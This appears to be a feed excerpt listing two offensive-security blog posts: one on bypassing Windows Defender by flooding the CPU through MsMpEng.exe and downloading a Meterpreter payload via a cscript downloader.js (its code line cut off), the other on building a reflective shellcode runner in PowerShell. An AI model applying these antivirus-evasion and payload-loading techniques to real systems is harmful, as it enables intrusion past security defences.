entry.title: Starving Defender – Bypass AV by flooding CPU via MsMpEng.exe

link.title: Starving Defender – Bypass AV by flooding CPU via MsMpEng.exe

entry.summary: JS Launcher This is a quick, dirty, and very loud method of bypassing Windows Defender. Note that the Meterpreter payload will touch the disk in this scenario. I wanted to demonstrate an absurdly easy way of walking through Defender’s doors. To download a Meterpreter payload to the disk, we will use cscript.exe by creating a downloader.js file and double-clicking it. var url = "http://10.8.8...

entry.title: Reflective shellcode runner in PowerShell
entry.summary: Part 1 - Understanding the mechanics LookupFunc: finding Windows API modules and functions We’ll examine how to call Windows API functions from PowerShell, starting with displaying a message box. First, we need a way to locate functions in DLLs. We can use technique known as dynamic lookup. We will create the .NET assembly in memory.
